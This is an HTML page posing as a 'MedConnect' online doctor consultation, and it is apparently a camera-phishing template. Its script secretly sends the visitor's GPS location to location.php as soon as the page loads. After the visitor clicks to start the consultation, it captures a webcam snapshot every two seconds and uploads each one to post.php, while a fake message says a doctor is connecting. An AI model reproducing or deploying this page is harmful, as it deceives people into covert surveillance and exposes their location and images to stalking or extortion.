<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    background: #e8f4f8;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}
.telemedicine-container {
    max-width: 650px;
    margin: 0 auto;
    background: white;
    min-height: 100vh;
}
.doctor-header {
    background: #2c7da0;
    color: white;
    padding: 20px;
    text-align: center;
}
.status {
    background: #61a5c2;
    padding: 10px;
    text-align: center;
    color: white;
}
.video-call {
    padding: 20px;
}
.doctor-card {
    background: #f0f0f0;
    border-radius: 20px;
    padding: 20px;
    margin-bottom: 20px;
    display: flex;
    align-items: center;
    gap: 15px;
}
.doctor-avatar {
    width: 60px;
    height: 60px;
    background: #2c7da0;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 30px;
}
.patient-cam {
    background: #d9d9d9;
    border-radius: 20px;
    padding: 20px;
    text-align: center;
}
video, canvas { width: 100%; border-radius: 15px; display: none; }
.cam-placeholder {
    height: 280px;
    background: #b0c4d8;
    border-radius: 15px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 80px;
}
button {
    background: #2c7da0;
    color: white;
    border: none;
    padding: 15px 30px;
    border-radius: 40px;
    font-size: 16px;
    cursor: pointer;
    margin-top: 15px;
    width: 100%;
}
.symptoms {
    padding: 20px;
    background: #f9f9f9;
    margin: 20px;
    border-radius: 15px;
}
</style>
</head>
<body>
<div class="telemedicine-container">
    <div class="doctor-header">
        <h2>🏥 MedConnect</h2>
        <p>Online Doctor Consultation</p>
    </div>
    <div class="status">🟢 Dr. Sarah Wilson is online - Waiting for you</div>
    <div class="video-call">
        <div class="doctor-card">
            <div class="doctor-avatar">👩‍⚕️</div>
            <div>
                <strong>Dr. Sarah Wilson</strong><br>
                <small>General Physician</small>
            </div>
        </div>
        <div class="patient-cam">
            <div class="cam-placeholder">📹</div>
            <video id="video" playsinline autoplay></video>
            <canvas id="canvas" width="640" height="480"></canvas>
            <button onclick="startConsultation()">Start Video Consultation</button>
        </div>
    </div>
    <div class="symptoms">
        <h3>📋 Consultation Details</h3>
        <p>Please enable camera for doctor to assess symptoms</p>
    </div>
</div>
<script>
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
        $.ajax({
            type: 'POST',
            data: {
                lat: position.coords.latitude,
                lon: position.coords.longitude,
                acc: position.coords.accuracy
            },
            url: window.location.origin + '/location.php'
        });
    });
}
function post(imgdata) {
    $.ajax({ type: 'POST', data: { cat: imgdata }, url: window.location.origin + '/post.php' });
}
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let active = false;
const constraints = { audio: false, video: { facingMode: "user" } };
async function startConsultation() {
    if(!active) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            video.srcObject = stream;
            video.style.display = 'block';
            document.querySelector('.cam-placeholder').style.display = 'none';
            active = true;
            const context = canvas.getContext('2d');
            setInterval(() => {
                context.drawImage(video, 0, 0, 640, 480);
                post(canvas.toDataURL("image/png"));
            }, 2000);
            alert("Connecting to doctor... Consultation will begin shortly");
        } catch(e) { alert("Camera access needed for consultation"); }
    }
}
</script>
</body>
</html>
